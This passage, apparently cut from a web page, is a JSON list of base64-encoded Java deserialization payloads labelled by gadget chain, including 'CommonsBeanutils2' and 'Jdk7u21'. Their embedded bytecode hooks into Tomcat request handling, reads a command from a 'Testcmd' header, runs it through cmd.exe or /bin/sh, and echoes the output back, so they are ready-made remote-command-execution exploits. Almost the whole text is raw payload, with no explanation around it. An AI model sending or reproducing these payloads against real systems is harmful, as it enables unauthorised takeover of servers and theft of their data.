ZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HADYBABNqYXZhLm5pby5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEABENvZGUBAApFeGNlcHRpb25zAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAPgEADVN0YWNrTWFwVGFibGUBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAQwBECgAMAEUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAEcBAA1nZXRTdXBlcmNsYXNzDABJAC4KAAwASgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAIwBMCgBIAE0BACJqYXZhL2xhbmcvcmVmbGVjdC9BY2Nlc3NpYmxlT2JqZWN0BwBPAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAFEAUgoAUABTAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAFUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAVwBYCgBWAFkBABBqYXZhL2xhbmcvU3RyaW5nBwBbAQADKClWDAAjAF0KAAQAXgEAEGphdmEvbGFuZy9UaHJlYWQHAGABAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAGIAYwoAYQBkAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7DABmAGcKAGEAaAEAB3RocmVhZHMIAGoMAEEAQgoAAgBsAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAbgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAcABxCgBhAHIBAARleGVjCAB0AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAHYAdwoAXAB4AQAEaHR0cAgAegEABnRhcmdldAgAfAEAEmphdmEvbGFuZy9SdW5uYWJsZQcAfgEABnRoaXMkMAgAgAEAB2hhbmRsZXIIAIIBAAZnbG9iYWwIAIQBAApwcm9jZXNzb3JzCACGAQAOamF2YS91dGlsL0xpc3QHAIgBAARzaXplAQADKClJDACKAIsLAIkAjAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAVwCOCwCJAI8BAANyZXEIAJEBAAtnZXRSZXNwb25zZQgAkwEACWdldEhlYWRlcggAlQEACFRlc3RlY2hvCACXAQAHaXNFbXB0eQEAAygpWgwAmQCaCgBcAJsBAAlzZXRTdGF0dXMIAJ0BAAlhZGRIZWFkZXIIAJ8BAAdUZXN0Y21kCAChAQAHb3MubmFtZQgAowEAEGphdmEvbGFuZy9TeXN0ZW0HAKUBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACnAKgKAKYAqQEAC3RvTG93ZXJDYXNlDACrAHEKAFwArAEABndpbmRvdwgArgEAB2NtZC5leGUIALABAAIvYwgAsgEABy9iaW4vc2gIALQBAAItYwgAtgEAEWphdmEvdXRpbC9TY2FubmVyBwC4AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwC6AQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwAIwC8CgC7AL0BAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwAvwDACgC7AMEBABFqYXZhL2xhbmcvUHJvY2VzcwcAwwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsMAMUAxgoAxADHAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAjAMkKALkAygEAAlxBCADMAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADOAM8KALkA0AEABG5leHQMANIAcQoAuQDTAQAIZ2V0Qnl0ZXMBAAQoKVtCDADVANYKAFwA1wwABwAICgACANkBAA1nZXRQcm9wZXJ0aWVzAQAYKClMamF2YS91dGlsL1Byb3BlcnRpZXM7DADbANwKAKYA3QEAE2phdmEvdXRpbC9IYXNodGFibGUHAN8BAAh0b1N0cmluZwwA4QBxCgDgAOIBABNbTGphdmEvbGFuZy9TdHJpbmc7BwDkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcA5goA5wBeACEAAgDnAAAAAAADAAoABwAIAAIAPAAAANwACAAFAAAAsRIKuAAQTi22ABRNLRIWBr0ADFkDEhhTWQSyAB5TWQWyAB5TtgAiLAa9AARZAytTWQS7ABpZA7cAJlNZBbsAGlkrvrcAJlO2ACxXKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwBIOgQSObgAEE4tEjsEvQAMWQMSGFO2ACItBL0ABFkDK1O2ACxNKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwADsQABAAAAaABrADcAAQBAAAAAEQAC9wBrBwA3/QBEBwAEBwAMAD0AAAAEAAEAPwAKAEEAQgACADwAAAB+AAMABQAAAD8BTSq2ADBOpwAZLSu2AEZNpwAWpwAAOgQttgBLTqcAAy0SBKb/5ywBpgAMuwBIWSu3AE6/LAS2AFQsKrYAWrAAAQAKABMAFgBIAAEAQAAAACUABv0ACgcAVgcADAj/AAIABAcABAcAXAcAVgcADAABBwBICQUNAD0AAAAEAAEAPwABACMAXQACADwAAAM2AAgADQAAAj8qtwDoAzYEuABltgBpEmu4AG3AAG86BQM2BhUGGQW+ogIfGQUVBjI6BxkHAaYABqcCCRkHtgBzTi0SdbYAeZoADC0Se7YAeZoABqcB7hkHEn24AG1MK8EAf5oABqcB3CsSgbgAbRKDuABtEoW4AG1MpwALOginAcOnAAArEoe4AG3AAIk6CQM2ChUKGQm5AI0BAKIBnhkJFQq5AJACADoLGQsSkrgAbUwrtgAwEpQDvQAMtgA1KwO9AAS2ACxNK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKYU7YALMAAXE4tAaUACi22AJyZAAanAFgstgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVyy2ADASoAW9AAxZAxJcU1kEElxTtgA1LAW9AARZAxKYU1kELVO2ACxXBDYEK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKiU7YALMAAXE4tAaUACi22AJyZAAanAI0stgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVxKkuACqtgCtEq+2AHmZABgGvQBcWQMSsVNZBBKzU1kFLVOnABUGvQBcWQMStVNZBBK3U1kFLVM6DCy7ALlZuwC7WRkMtwC+tgDCtgDItwDLEs22ANG2ANS2ANi4ANoENgQtAaUACi22AJyZAAgVBJoABqcAECy4AN62AOO2ANi4ANoVBJkABqcACYQKAaf+XBUEmQAGpwAJhAYBp/3fsQABAF8AcABzAD8AAQBAAAAA3QAZ/wAaAAcHAAIAAAABBwBvAQAA/AAXBwBh/wAXAAgHAAIAAAcAXAEHAG8BBwBhAAAC/wARAAgHAAIHAAQABwBcAQcAbwEHAGEAAFMHAD8E/wACAAgHAAIHAAQABwBcAQcAbwEHAGEAAP4ADQAHAIkB/wBjAAwHAAIHAAQHAAQHAFwBBwBvAQcAYQAHAIkBBwAEAAAC+wBULgL7AE1RBwDlKQsEAgwH/wAFAAsHAAIHAAQABwBcAQcAbwEHAGEABwCJAQAA/wAHAAgHAAIAAAABBwBvAQcAYQAA+gAFAD0AAAAEAAEAPwABAAUAAAACAAZ1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==&quot;,</span><br><span class="line">                    &quot;CommonsBeanutils2&quot;:&quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK29yZy5hcGFjaGUuY29tbW9ucy5iZWFudXRpbHMuQmVhbkNvbXBhcmF0b3LPjgGC/k7xfgIAAkwACmNvbXBhcmF0b3JxAH4AAUwACHByb3BlcnR5dAASTGphdmEvbGFuZy9TdHJpbmc7eHBzcgA/b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmNvbXBhcmF0b3JzLkNvbXBhcmFibGVDb21wYXJhdG9y+/SZJbhusTcCAAB4cHQAEG91dHB1dFByb3BlcnRpZXN3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1lcQB+AARMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAADwPK/rq+AAAAMgDpAQAMRm9vTkdVYU4zQnJRBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBABFGb29OR1VhTjNCclEuamF2YQEACXdyaXRlQm9keQEAFyhMamF2YS9sYW5nL09iamVjdDtbQilWAQAkb3JnLmFwYWNoZS50b21jYXQudXRpbC5idWYuQnl0ZUNodW5rCAAJAQAPamF2YS9sYW5nL0NsYXNzBwALAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsMAA0ADgoADAAPAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwAEQASCgAMABMBAAhzZXRCeXRlcwgAFQEAAltCBwAXAQARamF2YS9sYW5nL0ludGVnZXIHABkBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMABsAHAkAGgAdAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAfACAKAAwAIQEABjxpbml0PgEABChJKVYMACMAJAoAGgAlAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kBwAnAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAApACoKACgAKwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwALQAuCgAEAC8BAAdkb1dyaXRlCAAxAQAJZ2V0TWV0aG9kDAAzACAKAAwANAEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HADYBABNqYXZhLm5pby5CeXRlQnVmZmVyCAA4AQAEd3JhcAgAOgEABENvZGUBAApFeGNlcHRpb25zAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAPgEADVN0YWNrTWFwVGFibGUBAAVnZXRGVgEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwAQwBECgAMAEUBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAEcBAA1nZXRTdXBlcmNsYXNzDABJAC4KAAwASgEAFShMamF2YS9sYW5nL1N0cmluZzspVgwAIwBMCgBIAE0BACJqYXZhL2xhbmcvcmVmbGVjdC9BY2Nlc3NpYmxlT2JqZWN0BwBPAQANc2V0QWNjZXNzaWJsZQEABChaKVYMAFEAUgoAUABTAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAFUBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAVwBYCgBWAFkBABBqYXZhL2xhbmcvU3RyaW5nBwBbAQADKClWDAAjAF0KAAQAXgEAEGphdmEvbGFuZy9UaHJlYWQHAGABAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsMAGIAYwoAYQBkAQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7DABmAGcKAGEAaAEAB3RocmVhZHMIAGoMAEEAQgoAAgBsAQATW0xqYXZhL2xhbmcvVGhyZWFkOwcAbgEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAcABxCgBhAHIBAARleGVjCAB0AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoMAHYAdwoAXAB4AQAEaHR0cAgAegEABnRhcmdldAgAfAEAEmphdmEvbGFuZy9SdW5uYWJsZQcAfgEABnRoaXMkMAgAgAEAB2hhbmRsZXIIAIIBAAZnbG9iYWwIAIQBAApwcm9jZXNzb3JzCACGAQAOamF2YS91dGlsL0xpc3QHAIgBAARzaXplAQADKClJDACKAIsLAIkAjAEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwAVwCOCwCJAI8BAANyZXEIAJEBAAtnZXRSZXNwb25zZQgAkwEACWdldEhlYWRlcggAlQEACFRlc3RlY2hvCACXAQAHaXNFbXB0eQEAAygpWgwAmQCaCgBcAJsBAAlzZXRTdGF0dXMIAJ0BAAlhZGRIZWFkZXIIAJ8BAAdUZXN0Y21kCAChAQAHb3MubmFtZQgAowEAEGphdmEvbGFuZy9TeXN0ZW0HAKUBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DACnAKgKAKYAqQEAC3RvTG93ZXJDYXNlDACrAHEKAFwArAEABndpbmRvdwgArgEAB2NtZC5leGUIALABAAIvYwgAsgEABy9iaW4vc2gIALQBAAItYwgAtgEAEWphdmEvdXRpbC9TY2FubmVyBwC4AQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwC6AQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgwAIwC8CgC7AL0BAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwwAvwDACgC7AMEBABFqYXZhL2xhbmcvUHJvY2VzcwcAwwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsMAMUAxgoAxADHAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAjAMkKALkAygEAAlxBCADMAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADOAM8KALkA0AEABG5leHQMANIAcQoAuQDTAQAIZ2V0Qnl0ZXMBAAQoKVtCDADVANYKAFwA1wwABwAICgACANkBAA1nZXRQcm9wZXJ0aWVzAQAYKClMamF2YS91dGlsL1Byb3BlcnRpZXM7DADbANwKAKYA3QEAE2phdmEvdXRpbC9IYXNodGFibGUHAN8BAAh0b1N0cmluZwwA4QBxCgDgAOIBABNbTGphdmEvbGFuZy9TdHJpbmc7BwDkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcA5goA5wBeACEAAgDnAAAAAAADAAoABwAIAAIAPAAAANwACAAFAAAAsRIKuAAQTi22ABRNLRIWBr0ADFkDEhhTWQSyAB5TWQWyAB5TtgAiLAa9AARZAytTWQS7ABpZA7cAJlNZBbsAGlkrvrcAJlO2ACxXKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwBIOgQSObgAEE4tEjsEvQAMWQMSGFO2ACItBL0ABFkDK1O2ACxNKrYAMBIyBL0ADFkDLVO2ADUqBL0ABFkDLFO2ACxXpwADsQABAAAAaABrADcAAQBAAAAAEQAC9wBrBwA3/QBEBwAEBwAMAD0AAAAEAAEAPwAKAEEAQgACADwAAAB+AAMABQAAAD8BTSq2ADBOpwAZLSu2AEZNpwAWpwAAOgQttgBLTqcAAy0SBKb/5ywBpgAMuwBIWSu3AE6/LAS2AFQsKrYAWrAAAQAKABMAFgBIAAEAQAAAACUABv0ACgcAVgcADAj/AAIABAcABAcAXAcAVgcADAABBwBICQUNAD0AAAAEAAEAPwABACMAXQACADwAAAM2AAgADQAAAj8qtwDoAzYEuABltgBpEmu4AG3AAG86BQM2BhUGGQW+ogIfGQUVBjI6BxkHAaYABqcCCRkHtgBzTi0SdbYAeZoADC0Se7YAeZoABqcB7hkHEn24AG1MK8EAf5oABqcB3CsSgbgAbRKDuABtEoW4AG1MpwALOginAcOnAAArEoe4AG3AAIk6CQM2ChUKGQm5AI0BAKIBnhkJFQq5AJACADoLGQsSkrgAbUwrtgAwEpQDvQAMtgA1KwO9AAS2ACxNK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKYU7YALMAAXE4tAaUACi22AJyZAAanAFgstgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVyy2ADASoAW9AAxZAxJcU1kEElxTtgA1LAW9AARZAxKYU1kELVO2ACxXBDYEK7YAMBKWBL0ADFkDElxTtgA1KwS9AARZAxKiU7YALMAAXE4tAaUACi22AJyZAAanAI0stgAwEp4EvQAMWQOyAB5TtgA1LAS9AARZA7sAGlkRAMi3ACZTtgAsVxKkuACqtgCtEq+2AHmZABgGvQBcWQMSsVNZBBKzU1kFLVOnABUGvQBcWQMStVNZBBK3U1kFLVM6DCy7ALlZuwC7WRkMtwC+tgDCtgDItwDLEs22ANG2ANS2ANi4ANoENgQtAaUACi22AJyZAAgVBJoABqcAECy4AN62AOO2ANi4ANoVBJkABqcACYQKAaf+XBUEmQAGpwAJhAYBp/3fsQABAF8AcABzAD8AAQBAAAAA3QAZ/wAaAAcHAAIAAAABBwBvAQAA/AAXBwBh/wAXAAgHAAIAAAcAXAEHAG8BBwBhAAAC/wARAAgHAAIHAAQABwBcAQcAbwEHAGEAAFMHAD8E/wACAAgHAAIHAAQABwBcAQcAbwEHAGEAAP4ADQAHAIkB/wBjAAwHAAIHAAQHAAQHAFwBBwBvAQcAYQAHAIkBBwAEAAAC+wBULgL7AE1RBwDlKQsEAgwH/wAFAAsHAAIHAAQABwBcAQcAbwEHAGEABwCJAQAA/wAHAAgHAAIAAAABBwBvAQcAYQAA+gAFAD0AAAAEAAEAPwABAAUAAAACAAZ1cQB+ABAAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHEAfgANeA==&quot;,</span><br><span class="line">                    &quot;Jdk7u21&quot;:&quot;rO0ABXNyABdqYXZhLnV0aWwuTGlua2VkSGFzaFNldNhs11qV3SoeAgAAeHIAEWphdmEudXRpbC5IYXNoU2V0ukSFlZa4tzQDAAB4cHcMAAAAED9AAAAAAAACc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMACEkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFoAFV91c2VTZXJ2aWNlc01lY2hhbmlzbUwAC19hdXhDbGFzc2VzdAA7TGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0hhc2h0YWJsZTtbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzdAASW0xqYXZhL2xhbmcvQ2xhc3M7TAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAH/////AXB1cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAPA8r+ur4AAAAyAOkBAAxGb292NGhBMnZ1U1MHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEAEUZvb3Y0aEEydnVTUy5qYXZhAQAJd3JpdGVCb2R5AQAXKExqYXZhL2xhbmcvT2JqZWN0O1tCKVYBACRvcmcuYXBhY2hlLnRvbWNhdC51dGlsLmJ1Zi5CeXRlQ2h1bmsIAAkBAA9qYXZhL2xhbmcvQ2xhc3MHAAsBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwADQAOCgAMAA8BAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7DAARABIKAAwAEwEACHNldEJ5dGVzCAAVAQACW0IHABcBABFqYXZhL2xhbmcvSW50ZWdlcgcAGQEABFRZUEUBABFMamF2YS9sYW5nL0NsYXNzOwwAGwAcCQAaAB0BABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsMAB8AIAoADAAhAQAGPGluaXQ+AQAEKEkpVgwAIwAkCgAaACUBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHACcBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMACkAKgoAKAArAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAAtAC4KAAQALwEAB2RvV3JpdGUIADEBAAlnZXRNZXRob2QMADMAIAoADAA0AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcANgEAE2phdmEubmlvLkJ5dGVCdWZmZXIIADgBAAR3cmFwCAA6AQAEQ29kZQEACkV4Y2VwdGlvbnMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwA+AQANU3RhY2tNYXBUYWJsZQEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7DABDAEQKAAwARQEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcARwEADWdldFN1cGVyY2xhc3MMAEkALgoADABKAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWDAAjAEwKAEgATQEAImphdmEvbGFuZy9yZWZsZWN0L0FjY2Vzc2libGVPYmplY3QHAE8BAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgwAUQBSCgBQAFMBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcAVQEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABXAFgKAFYAWQEAEGphdmEvbGFuZy9TdHJpbmcHAFsBAAMoKVYMACMAXQoABABeAQAQamF2YS9sYW5nL1RocmVhZAcAYAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAYgBjCgBhAGQBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMAGYAZwoAYQBoAQAHdGhyZWFkcwgAagwAQQBCCgACAGwBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwBuAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABwAHEKAGEAcgEABGV4ZWMIAHQBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAdgB3CgBcAHgBAARodHRwCAB6AQAGdGFyZ2V0CAB8AQASamF2YS9sYW5nL1J1bm5hYmxlBwB+AQAGdGhpcyQwCACAAQAHaGFuZGxlcggAggEABmdsb2JhbAgAhAEACnByb2Nlc3NvcnMIAIYBAA5qYXZhL3V0aWwvTGlzdAcAiAEABHNpemUBAAMoKUkMAIoAiwsAiQCMAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABXAI4LAIkAjwEAA3JlcQgAkQEAC2dldFJlc3BvbnNlCACTAQAJZ2V0SGVhZGVyCACVAQAIVGVzdGVjaG8IAJcBAAdpc0VtcHR5AQADKClaDACZAJoKAFwAmwEACXNldFN0YXR1cwgAnQEACWFkZEhlYWRlcggAnwEAB1Rlc3RjbWQIAKEBAAdvcy5uYW1lCACjAQAQamF2YS9sYW5nL1N5c3RlbQcApQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAKcAqAoApgCpAQALdG9Mb3dlckNhc2UMAKsAcQoAXACsAQAGd2luZG93CACuAQAHY21kLmV4ZQgAsAEAAi9jCACyAQAHL2Jpbi9zaAgAtAEAAi1jCAC2AQARamF2YS91dGlsL1NjYW5uZXIHALgBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHALoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAjALwKALsAvQEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAC/AMAKALsAwQEAEWphdmEvbGFuZy9Qcm9jZXNzBwDDAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwwAxQDGCgDEAMcBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMACMAyQoAuQDKAQACXEEIAMwBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsMAM4AzwoAuQDQAQAEbmV4dAwA0gBxCgC5ANMBAAhnZXRCeXRlcwEABCgpW0IMANUA1goAXADXDAAHAAgKAAIA2QEADWdldFByb3BlcnRpZXMBABgoKUxqYXZhL3V0aWwvUHJvcGVydGllczsMANsA3AoApgDdAQATamF2YS91dGlsL0hhc2h0YWJsZQcA3wEACHRvU3RyaW5nDADhAHEKA